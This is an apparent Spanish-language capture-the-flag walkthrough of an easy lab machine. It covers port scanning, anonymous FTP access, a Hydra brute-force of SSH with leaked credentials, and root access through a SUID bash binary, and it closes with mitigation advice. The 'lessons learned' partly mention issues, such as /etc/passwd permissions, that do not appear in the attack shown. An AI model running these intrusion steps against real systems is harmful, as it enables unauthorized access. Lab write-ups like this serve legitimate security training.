
## Información General

| Campo          | Valor       |
| -------------- | ----------- |
| **Plataforma** | whoami-labs |
| **Dificultad** | Fácil       |
| **Autor**      | elc0ket     |
## Técnicas

Enumeración FTP, Fuerza bruta SSH, Escalada por SUID

---
## Fase 1: Reconocimiento (Enumeración)
### Escaneo de Puertos con Nmap

Realizamos un escaneo completo de puertos para identificar servicios activos en la máquina objetivo.

```bash
nmap -p- -sS --min-rate 5000 -n -vvv -Pn -sC -sV -oN ports 172.17.0.2
```

**Resultados:**

![[Writeup/whoami-labs/images/IMG-20260624180929272.png]]


**Análisis:**

- **Puerto 21 (FTP):** vsftpd 3.0.5 - Podríamos probar acceso anónimo
    
- **Puerto 22 (SSH):** OpenSSH 9.2p1 - Posible vector de ataque con credenciales
    
- **Puerto 80 (HTTP):** Apache 2.4.62 - Servidor web por enumerar
    

---

### Enumeración FTP

Probamos acceso anónimo al servicio FTP, ya que es una práctica común en máquinas CTF.

```bash
ftp 172.17.0.2
```

**Credenciales:**

- Usuario: `anonymous`
    
- Contraseña: (vacía) 

![[Writeup/whoami-labs/images/IMG-20260624181024699.png]]


**Explorando el FTP:**

```bash
ftp> ls
```

![[Writeup/whoami-labs/images/IMG-20260624181107710.png]]

```bash
ftp> cd pub
ftp> ls
```

![[Writeup/whoami-labs/images/IMG-20260624181146057.png]]


**Hallazgo crítico:** Encontramos un archivo `usuarios.txt` en el directorio `pub`.

**Descarga del archivo:**

```bash
ftp> get usuarios.txt
ftp> exit
```

![[Writeup/whoami-labs/images/IMG-20260624181227146.png]]

---


![[Writeup/whoami-labs/images/IMG-20260624181304689.png]]

**Observaciones:**

- Página por defecto de Apache
    
- No hay información relevante en el código fuente
    
- No se encontraron directorios adicionales con herramientas como `gobuster`
    

---

## Explotación

### Análisis del Archivo `usuarios.txt`

```bash
cat usuarios.txt
```

![[Writeup/whoami-labs/images/IMG-20260624181346563.png]]

**Observaciones:**

- Contiene **6 pares de credenciales** en formato `usuario:contraseña`
    
- Las contraseñas son débiles y comunes
    
- Posiblemente son credenciales válidas para el servicio SSH

### Preparación para Ataque de Fuerza Bruta

Separamos usuarios y contraseñas en archivos independientes.

```bash
# Extraer solo los usuarios (primera columna)
cut -d: -f1 usuarios.txt > users.txt

# Extraer solo las contraseñas (segunda columna)
cut -d: -f2 usuarios.txt > passwd.txt
```

**Verificación:**

```bash
cat users.txt
```

![[Writeup/whoami-labs/images/IMG-20260624181426539.png]]

```bash
cat passwd.txt
```

![[Writeup/whoami-labs/images/IMG-20260624181449860.png]]

### Ataque con Hydra (SSH)

Usamos Hydra para probar las credenciales contra el servicio SSH.

```bash
hydra -L users.txt -P passwd.txt ssh://172.17.0.2 -t 4 -f
```

**Resultado esperado:**

![[Writeup/whoami-labs/images/IMG-20260624181854535.png]]

### Conexión SSH

Nos conectamos con las credenciales encontradas.

```bash
ssh alberto@172.17.0.2
```

**Si aparece un error de clave SSH:**

```bash
# Eliminar la clave antigua del archivo known_hosts
ssh-keygen -f '/home/kali/.ssh/known_hosts' -R '172.17.0.2'
```

```bash
# Conectar de nuevo
ssh alberto@172.17.0.2
```

**Credenciales:**

- Usuario: `alberto`
    
- Contraseña: `admin123`

**Conexión exitosa:**

![[Writeup/whoami-labs/images/IMG-20260624181943988.png]]

---

## Escalada de Privilegios

### Enumeración del Sistema

**1. Verificar `usuario`:**

```
bash-5.2$ whoami
```

![[Writeup/whoami-labs/images/IMG-20260624182016028.png]]

**2. Verificar permisos `sudo`:**

```bash
bash-5.2$ sudo -l
```

![[Writeup/whoami-labs/images/IMG-20260624182054517.png]]

**Conclusión:** El usuario `alberto` no tiene permisos `sudo`.

**3. Buscar binarios con SUID activado:**

```bash
bash-5.2$ find / -perm -4000 2>/dev/null
```

![[Writeup/whoami-labs/images/IMG-20260624182149061.png]]

**Hallazgo crítico:** `/usr/bin/bash` tiene el bit SUID activado.

### Explotación del SUID

```bash
bash-5.2$ /usr/bin/bash -p
```

![[Writeup/whoami-labs/images/IMG-20260624182218436.png]]

```
bash-5.2# whoami
```

![[Writeup/whoami-labs/images/IMG-20260624182315215.png]]
### Captura de la Flag

```bash
bash-5.2# cd /root
```

![[Writeup/whoami-labs/images/IMG-20260624182401122.png]]

---

## Conclusión

### Resumen del Ataque

| Fase                   | Acción                      | Resultado                       |
| ---------------------- | --------------------------- | ------------------------------- |
| **1. Reconocimiento**  | Escaneo Nmap                | Puertos 21, 22, 80 abiertos     |
| **2. Enumeración FTP** | Acceso anónimo              | Descarga de `usuarios.txt`      |
| **3. Fuerza Bruta**    | Hydra contra SSH            | Credenciales `alberto:admin123` |
| **4. Escalada**        | SUID en `/bin/bash`         | Shell como root                 |
| **5. Flag**            | Lectura de `/root/flag.txt` | `@n0n_h@CKEr`                   |

### Lecciones Aprendidas

1. **Hardening:** `/etc/passwd` nunca debe permitir escritura a grupos comunes; sus permisos deben ser estrictamente `644` (`root:root`).
 
2. **Seguridad Web:** No exponer diccionarios ni listas de usuarios en directorios indexables públicamente.
    
3. **Gestión de Accesos:** Implementar contraseñas robustas y herramientas como `Fail2Ban` para mitigar ataques de fuerza bruta en SSH.
 

### Medidas de Mitigación

1. Deshabilitar el acceso anónimo en FTP
    
2. No almacenar credenciales en texto plano
    
3. Eliminar el bit SUID de binarios que no lo requieran
    
4. Implementar políticas de contraseñas seguras
    

---

